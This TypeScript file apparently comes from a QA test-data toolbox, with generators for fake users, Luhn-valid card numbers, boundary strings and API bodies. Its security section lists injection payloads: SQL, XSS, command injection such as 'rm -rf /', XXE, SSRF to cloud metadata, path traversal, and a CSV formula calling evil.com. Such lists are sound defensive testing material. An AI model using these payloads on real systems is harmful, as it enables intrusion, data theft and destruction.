import { faker } from '@faker-js/faker';
import crypto from 'crypto';

// Helpers for manual generation if needed
function generateLuhn(prefix: string, length: number): string {
  let ccNumber = prefix;
  while (ccNumber.length < length - 1) {
    ccNumber += Math.floor(Math.random() * 10).toString();
  }

  // Calculate checksum
  let sum = 0;
  let shouldDouble = true;
  for (let i = ccNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(ccNumber.charAt(i));
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }

  const checksum = (10 - (sum % 10)) % 10;
  return ccNumber + checksum.toString();
}

export const Generators = {
  // ==========================================
  // USER DATA
  // ==========================================
  user: () => {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const email = faker.internet.email({ firstName, lastName });
    const username = faker.internet.username({ firstName, lastName });
    const phone = faker.phone.number();
    const company = faker.company.name();
    const job = faker.person.jobTitle();
    
    return {
      id: crypto.randomUUID(),
      firstName,
      lastName,
      username,
      email,
      phone,
      company,
      job,
      avatar: faker.image.avatar(),
    };
  },

  company: () => ({
    id: crypto.randomUUID(),
    name: faker.company.name(),
    catchPhrase: faker.company.catchPhrase(),
    buzzPhrase: faker.company.buzzPhrase(),
    industry: faker.person.jobArea(),
    employeesCount: faker.number.int({ min: 10, max: 15000 }),
    website: faker.internet.url(),
  }),

  address: () => ({
    streetAddress: faker.location.streetAddress(),
    secondaryAddress: faker.location.secondaryAddress(),
    city: faker.location.city(),
    state: faker.location.state(),
    stateAbbr: faker.location.state({ abbreviated: true }),
    zipCode: faker.location.zipCode(),
    country: faker.location.country(),
    countryCode: faker.location.countryCode(),
    latitude: faker.location.latitude(),
    longitude: faker.location.longitude(),
  }),

  phone: () => ({
    phoneNumber: faker.phone.number(),
    internationalNumber: `+1-${faker.number.int({ min: 200, max: 999 })}-${faker.number.int({ min: 200, max: 999 })}-${faker.number.int({ min: 1000, max: 9999 })}`,
    rawDigits: faker.string.numeric(10),
  }),

  email: () => ({
    email: faker.internet.email(),
    disposableEmail: `temp_${faker.string.alphanumeric(8)}@mailinator.com`,
    workEmail: faker.internet.email({ provider: 'company.com' }),
  }),

  username: () => ({
    username: faker.internet.username(),
    cleanUsername: faker.internet.username().replace(/[^a-zA-Z0-9]/g, ''),
    complexUsername: `${faker.internet.username()}_${faker.number.int(999)}`,
  }),

  password: (len = 12) => {
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const digits = '0123456789';
    const symbols = '!@#$%^&*()_+-=[]{}|;:,.<>?';
    const all = uppercase + lowercase + digits + symbols;
    
    let password = '';
    password += uppercase[crypto.randomInt(uppercase.length)];
    password += lowercase[crypto.randomInt(lowercase.length)];
    password += digits[crypto.randomInt(digits.length)];
    password += symbols[crypto.randomInt(symbols.length)];

    for (let i = 4; i < len; i++) {
      password += all[crypto.randomInt(all.length)];
    }

    // Shuffle password
    password = password.split('').sort(() => 0.5 - Math.random()).join('');
    return { password };
  },

  country: () => ({
    name: faker.location.country(),
    code: faker.location.countryCode(),
    continent: faker.location.timeZone().split('/')[0] || 'Global',
  }),

  state: () => ({
    name: faker.location.state(),
    abbr: faker.location.state({ abbreviated: true }),
  }),

  city: () => ({
    city: faker.location.city(),
    prefix: faker.location.city(),
  }),

  postal: () => ({
    postalCode: faker.location.zipCode(),
    zipCodePlus4: `${faker.string.numeric(5)}-${faker.string.numeric(4)}`,
  }),

  job: () => ({
    title: faker.person.jobTitle(),
    descriptor: faker.person.jobDescriptor(),
    area: faker.person.jobArea(),
    type: faker.person.jobType(),
  }),

  profile: () => {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const email = faker.internet.email({ firstName, lastName });
    const username = faker.internet.username({ firstName, lastName });
    
    return {
      id: crypto.randomUUID(),
      personal: {
        firstName,
        lastName,
        username,
        email,
        phone: faker.phone.number(),
        birthDate: faker.date.birthdate().toISOString().split('T')[0],
        gender: faker.person.sex(),
      },
      work: {
        company: faker.company.name(),
        jobTitle: faker.person.jobTitle(),
        department: faker.person.jobArea(),
        salary: faker.number.int({ min: 45000, max: 250000 }),
        workEmail: faker.internet.email({ firstName, lastName, provider: 'company.com' }),
      },
      address: {
        street: faker.location.streetAddress(),
        city: faker.location.city(),
        state: faker.location.state(),
        zip: faker.location.zipCode(),
        country: faker.location.country(),
      },
      payment: {
        cardType: 'Visa',
        cardNumber: generateLuhn('4', 16),
        cardExpiry: '12/28',
        cvv: faker.string.numeric(3),
      }
    };
  },

  // ==========================================
  // BOUNDARY TESTING
  // ==========================================
  boundary: (type: string) => {
    switch (type) {
      case 'empty':
        return { value: '', length: 0, description: 'Empty string / blank value' };
      case 'null':
        return { value: null, isNull: true, description: 'Database/JSON raw null' };
      case 'whitespace':
        return { value: ' '.repeat(50), length: 50, description: 'Whitespace-only string' };
      case 'char1':
        return { value: 'A', length: 1, description: 'Single character boundary' };
      case 'char5':
        return { value: 'A'.repeat(5), length: 5, description: '5 character boundary' };
      case 'char10':
        return { value: 'A'.repeat(10), length: 10, description: '10 character boundary' };
      case 'char50':
        return { value: 'A'.repeat(50), length: 50, description: '50 character boundary' };
      case 'char100':
        return { value: 'A'.repeat(100), length: 100, description: '100 character boundary' };
      case 'char500':
        return { value: 'A'.repeat(500), length: 500, description: '500 character boundary' };
      case 'char1000':
        return { value: 'A'.repeat(1000), length: 1000, description: '1,000 character boundary' };
      case 'char5000':
        return { value: 'A'.repeat(5000), length: 5000, description: '5,000 character boundary' };
      case 'char10000':
        return { value: 'A'.repeat(10000), length: 10000, description: '10,000 character boundary' };
      case 'unicode':
        return { value: 'ÇéâäàåçêëèïîìÄÅÉæÆôöòûùÿÖÜ¢£¥₧ƒ', description: 'Standard extended Unicode symbols' };
      case 'emoji':
        return { value: '😀😃😄😁😆😅😂🤣😭😉😊😇🥰😍🤩😘😗☺️🦄🦕🚀🔥🎉💻🌍🤖🍔🍕🍣', description: 'Multi-character emoji string' };
      case 'mixed':
        return { value: 'Hello Çéâäàå 😀😃😄 12345 !@#$%^&*() שָׁלוֹם السلام عليكم', description: 'Mixed alphabets, Unicode, emojis, and symbols' };
      case 'rtl':
        return { value: 'שָׁלוֹם עֲלֵיכֶם / السلام عليكم ورحمة الله وبركاته', description: 'Right-To-Left language scripts (Hebrew & Arabic)' };
      case 'url':
        return { value: 'https://example.com/api/v2/users/search/filter/details?category=testing&limit=100&offset=0&token=' + 'x'.repeat(400) + '&ref=qa_toolbox_v1_boundary_test_long_url_parameter', description: 'Extremely long URL payload' };
      case 'filename':
        return { value: 'test_report_export_data_qa_automation_run_system_log_' + 'x'.repeat(120) + '.pdf', description: 'Very long filename with many extensions' };
      case 'paragraph':
        return { value: faker.lorem.paragraphs(8), description: 'Large multi-paragraph text block' };
      default:
        return { error: 'Unknown boundary type' };
    }
  },

  // ==========================================
  // SECURITY PAYLOADS
  // ==========================================
  security: (type: string) => {
    const payloads: Record<string, string[]> = {
      sql: [
        `' OR '1'='1`,
        `' OR 1=1 --`,
        `admin' --`,
        `admin' #`,
        `' UNION SELECT username, password FROM users--`,
        `' AND 1=0 UNION SELECT null, concat(username,':',password) FROM users--`,
        `1; DROP TABLE users;--`,
        `1' OR '1'='1' UNION SELECT NULL,@@VERSION,NULL,NULL--`,
        `' OR EXISTS(SELECT * FROM users) AND '1'='1`,
      ],
      xss: [
        `<script>alert(1)</script>`,
        `<img src=x onerror=alert(1)>`,
        `<svg onload=alert(1)>`,
        `javascript:alert(1)`,
        `" onfocus="alert(1)" autofocus="`,
        `' onmouseover='alert(1)`,
        `<iframe src="javascript:alert(1)"></iframe>`,
        `<details open ontoggle="alert(1)">`,
        `<body onload=alert(1)>`,
      ],
      ldap: [
        `*`,
        `)(objectClass=*`,
        `admin)(|(password=*`,
        `*)(&(objectCategory=person)(objectClass=user))`,
        `*))(|(uid=*`,
      ],
      xpath: [
        `' or 1=1 or ''='`,
        `admin' or '1'='1`,
        `' or count(parent::*[position()=1])=0 or ''='`,
        `string(//user[position()=1]/password)`,
      ],
      command: [
        `; rm -rf /`,
        `&& ls -la`,
        `| cat /etc/passwd`,
        `; ping -c 4 127.0.0.1`,
        `$(whoami)`,
        `\`id\``,
        `& start notepad.exe`,
      ],
      xml: [
        `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`,
        `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz ANY><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><lolz>&lol2;</lolz>`,
      ],
      csv: [
        `=SUM(A1:A10)`,
        `=cmd|' /C calc'!A1`,
        `@SUM(A1:A2)*2`,
        `+1+2-cmd|' /C calc'!A1`,
        `=IMPORTXML("http://evil.com/log", "//a")`,
      ],
      crlf: [
        `%0d%0aSet-Cookie: user=admin`,
        `\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>XSS</html>`,
        `%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0A...`,
      ],
      ssrf: [
        `http://127.0.0.1:80`,
        `http://localhost:22`,
        `http://169.254.169.254/latest/meta-data/`,
        `http://metadata.google.internal/computeMetadata/v1/`,
        `http://127.0.0.1:2375/v1.24/containers/json`,
        `file:///etc/passwd`,
        `dict://127.0.0.1:11211/stat`,
      ],
      traversal: [
        `../../../../etc/passwd`,
        `..\\..\\..\\..\\windows\\win.ini`,
        `..%2f..%2f..%2fetc/passwd`,
        `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
        `/etc/passwd`,
      ],
      redirect: [
        `https://evil.com`,
        `//evil.com`,
        `https:google.com@evil.com`,
        `/%0D%0Aevil.com`,
        `/login?next=http://evil.com`,
      ],
    };

    const items = payloads[type] || [];
    return {
      category: type,
      payloads: items,
      randomSelected: items[Math.floor(Math.random() * items.length)] || '',
      description: `List of active payloads for security and injection vulnerability checking in ${type.toUpperCase()}.`
    };
  },

  // ==========================================
  // API PAYLOADS
  // ==========================================
  api: (type: string) => {
    switch (type) {
      case 'json':
        return {
          status: 'success',
          timestamp: new Date().toISOString(),
          data: {
            user: Generators.user(),
            config: {
              theme: 'dark',
              notifications: true,
              roles: ['editor', 'qa_engineer'],
            }
          }
        };
      case 'nested_json':
        return {
          id: 'nested-9821',
          org: 'QualityAssurance Corp',
          departments: [
            {
              name: 'Automation Unit',
              lead: {
                name: faker.person.fullName(),
                email: faker.internet.email(),
              },
              projects: [
                {
                  id: 'proj-1',
                  name: 'RegressShield',
                  stats: {
                    testCases: 450,
                    passingRate: 98.2,
                    suites: ['smoke', 'regression', 'security'],
                    pipelines: {
                      github: 'enabled',
                      jenkins: 'active',
                      logs: {
                        lastRun: new Date().toISOString(),
                        errors: [],
                      }
                    }
                  }
                }
              ]
            }
          ]
        };
      case 'huge_json': {
        const arr = [];
        for (let i = 0; i < 200; i++) {
          arr.push({
            index: i + 1,
            guid: crypto.randomUUID(),
            isActive: faker.datatype.boolean(),
            balance: `$${faker.finance.amount({ min: 1000, max: 10000, dec: 2 })}`,
            picture: faker.image.avatar(),
            age: faker.number.int({ min: 18, max: 65 }),
            name: faker.person.fullName(),
            company: faker.company.name(),
            email: faker.internet.email(),
            phone: faker.phone.number(),
            registered: faker.date.past().toISOString(),
          });
        }
        return arr;
      }
      case 'invalid_json':
        return `{
  "id": "invalid-json",
  "name": "QA Data Input",
  "missing_comma": "values"
  "broken_bracket": [
    "item1",
    "item2"
  ,
  "unclosed": {
    "nested": "yes"
}`;
      case 'xml': {
        const u = Generators.user();
        return `<?xml version="1.0" encoding="UTF-8"?>
<response>
  <status>success</status>
  <timestamp>${new Date().toISOString()}</timestamp>
  <data>
    <user id="${u.id}">
      <firstName>${u.firstName}</firstName>
      <lastName>${u.lastName}</lastName>
      <username>${u.username}</username>
      <email>${u.email}</email>
      <phone>${u.phone}</phone>
      <company>${u.company}</company>
      <job>${u.job}</job>
    </user>
  </data>
</response>`;
      }
      case 'invalid_xml':
        return `<?xml version="1.0" encoding="UTF-8"?>
<response>
  <status>success</status>
  <timestamp>${new Date().toISOString()}</timestamp>
  <data>
    <user id="broken-id">
      <firstName>Broken XML Document
      <lastName>Missing closing tags</lastName>
      <company>Bad XML Org</company>
  </data>
</response>`;
      case 'yaml': {
        const u = Generators.user();
        return `api_version: v1
metadata:
  name: qa-test-payload
  namespace: test-automation
  labels:
    environment: staging
    runner: github-actions
spec:
  user:
    id: "${u.id}"
    first_name: "${u.firstName}"
    last_name: "${u.lastName}"
    username: "${u.username}"
    email: "${u.email}"
    job_details:
      title: "${u.job}"
      company: "${u.company}"
  settings:
    active_runs: 5
    timeout_seconds: 30
    assertions:
      - status_code == 200
      - response_time < 500`;
      }
      case 'csv': {
        let csv = 'ID,First Name,Last Name,Username,Email,Company,Job Title\n';
        for (let i = 0; i < 10; i++) {
          const u = Generators.user();
          csv += `"${u.id}","${u.firstName}","${u.lastName}","${u.username}","${u.email}","${u.company}","${u.job}"\n`;
        }
        return csv;
      }
      case 'multipart': {
        const boundary = '----WebKitFormBoundaryqaToolboxData' + crypto.randomBytes(8).toString('hex');
        return `${boundary}
Content-Disposition: form-data; name="userId"

usr_901238910
${boundary}
Content-Disposition: form-data; name="file"; filename="test_screenshot.png"
Content-Type: image/png

[Binary Data - Simulated PNG Payload]
${boundary}
Content-Disposition: form-data; name="meta"
Content-Type: application/json

{"status": "uploaded", "category": "smoke_test"}
${boundary}--`;
      }
      default:
        return { error: 'Unknown API type' };
    }
  },

  // ==========================================
  // PAYMENT
  // ==========================================
  payment: (type: string) => {
    switch (type) {
      case 'visa':
        return {
          cardType: 'Visa',
          cardNumber: generateLuhn('4', 16),
          cardholder: faker.person.fullName(),
          expiry: '10/28',
          cvv: faker.string.numeric(3),
        };
      case 'mastercard':
        return {
          cardType: 'MasterCard',
          cardNumber: generateLuhn('51', 16),
          cardholder: faker.person.fullName(),
          expiry: '05/29',
          cvv: faker.string.numeric(3),
        };
      case 'amex':
        return {
          cardType: 'American Express',
          cardNumber: generateLuhn('37', 15),
          cardholder: faker.person.fullName(),
          expiry: '08/27',
          cvv: faker.string.numeric(4),
        };
      case 'cvv':
        return {
          cvv: faker.string.numeric(3),
          amexCvv: faker.string.numeric(4),
        };
      case 'expiry': {
        const month = String(faker.number.int({ min: 1, max: 12 })).padStart(2, '0');
        const year = faker.number.int({ min: 26, max: 32 });
        return {
          expiryDate: `${month}/${year}`,
          month,
          year: `20${year}`,
        };
      }
      case 'iban':
        return {
          iban: faker.finance.iban(),
          bic: faker.finance.bic(),
        };
      case 'upi': {
        const cleanName = faker.person.firstName().toLowerCase();
        const handles = ['okaxis', 'okhdfcbank', 'okicici', 'paytm', 'ybl'];
        return {
          upiId: `${cleanName}${faker.number.int(999)}@${handles[Math.floor(Math.random() * handles.length)]}`
        };
      }
      default:
        return { error: 'Unknown payment type' };
    }
  },

  // ==========================================
  // NETWORK
  // ==========================================
  network: (type: string) => {
    switch (type) {
      case 'ipv4':
        return { ipv4: faker.internet.ipv4() };
      case 'ipv6':
        return { ipv6: faker.internet.ipv6() };
      case 'mac':
        return { macAddress: faker.internet.mac() };
      case 'domain':
        return { domain: faker.internet.domainName() };
      case 'url':
        return { url: faker.internet.url() };
      case 'email':
        return { email: faker.internet.email() };
      case 'port': {
        const commonPorts = [80, 443, 21, 22, 23, 25, 53, 110, 143, 3306, 5432, 8080, 27017, 9200];
        const randomPort = faker.number.int({ min: 1024, max: 65535 });
        return {
          commonPort: commonPorts[Math.floor(Math.random() * commonPorts.length)],
          randomPort,
        };
      }
      default:
        return { error: 'Unknown network type' };
    }
  },

  // ==========================================
  // DATE & TIME
  // ==========================================
  datetime: (type: string) => {
    const now = new Date();
    switch (type) {
      case 'current':
        return {
          iso: now.toISOString(),
          local: now.toString(),
          utc: now.toUTCString(),
          date: now.toLocaleDateString(),
          time: now.toLocaleTimeString(),
        };
      case 'random': {
        const randDate = faker.date.between({ from: '1970-01-01', to: '2040-12-31' });
        return {
          iso: randDate.toISOString(),
          formatted: randDate.toISOString().split('T')[0],
          timestamp: randDate.getTime(),
        };
      }
      case 'past': {
        const pastDate = faker.date.past();
        return {
          iso: pastDate.toISOString(),
          formatted: pastDate.toISOString().split('T')[0],
          timeAgo: 'approximately ' + faker.number.int({ min: 1, max: 12 }) + ' months ago',
        };
      }
      case 'future': {
        const futureDate = faker.date.future();
        return {
          iso: futureDate.toISOString(),
          formatted: futureDate.toISOString().split('T')[0],
          timeInFuture: 'in approximately ' + faker.number.int({ min: 1, max: 5 }) + ' years',
        };
      }
      case 'leap': {
        const leapYears = [2000, 2004, 2008, 2012, 2016, 2020, 2024, 2028, 2032, 2036, 2040];
        const randLeap = leapYears[Math.floor(Math.random() * leapYears.length)];
        const leapDate = new Date(randLeap, 1, 29); // Feb 29
        return {
          leapYear: randLeap,
          leapDate: leapDate.toISOString().split('T')[0],
          iso: leapDate.toISOString(),
        };
      }
      case 'timestamp':
        return { timestamp: now.toISOString() };
      case 'unix':
        return { unixTimestamp: Math.floor(now.getTime() / 1000) };
      case 'timezone':
        return { timezone: faker.location.timeZone() };
      default:
        return { error: 'Unknown datetime type' };
    }
  },

  // ==========================================
  // DEVELOPER UTILITIES
  // ==========================================
  dev: (type: string, param?: string) => {
    switch (type) {
      case 'uuid':
        return { uuid: crypto.randomUUID() };
      case 'jwt': {
        const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
        const payload = Buffer.from(JSON.stringify({
          sub: 'qa_user_9021',
          name: 'QA Automation Engineer',
          role: 'administrator',
          iat: Math.floor(Date.now() / 1000),
          exp: Math.floor(Date.now() / 1000) + 3600,
          scope: 'read:reports write:testcases delete:data'
        })).toString('base64url');
        const signature = crypto.createHmac('sha256', 'qa_secret_key_12345').update(`${header}.${payload}`).digest('base64url');
        return { jwt: `${header}.${payload}.${signature}` };
      }
      case 'api_key':
        return { apiKey: 'qp_live_' + crypto.randomBytes(24).toString('hex') };
      case 'bearer':
        return { token: 'Bearer ' + crypto.randomBytes(32).toString('base64url') };
      case 'password':
        return Generators.password();
      case 'hex':
        return { hexColor: faker.color.rgb() };
      case 'rgb': {
        const r = crypto.randomInt(256);
        const g = crypto.randomInt(256);
        const b = crypto.randomInt(256);
        return { rgbColor: `rgb(${r}, ${g}, ${b})`, r, g, b };
      }
      case 'base64': {
        const textToEncode = param || 'QA Toolbox - Testing Data Automation Platform 2026';
        return {
          original: textToEncode,
          base64: Buffer.from(textToEncode).toString('base64')
        };
      }
      case 'sha256': {
        const textToHash = param || 'qa_toolbox_v1';
        return {
          original: textToHash,
          hash: crypto.createHash('sha256').update(textToHash).digest('hex')
        };
      }
      case 'md5': {
        const textToHash = param || 'qa_toolbox_v1';
        return {
          original: textToHash,
          hash: crypto.createHash('md5').update(textToHash).digest('hex')
        };
      }
      default:
        return { error: 'Unknown developer utility type' };
    }
  }
};
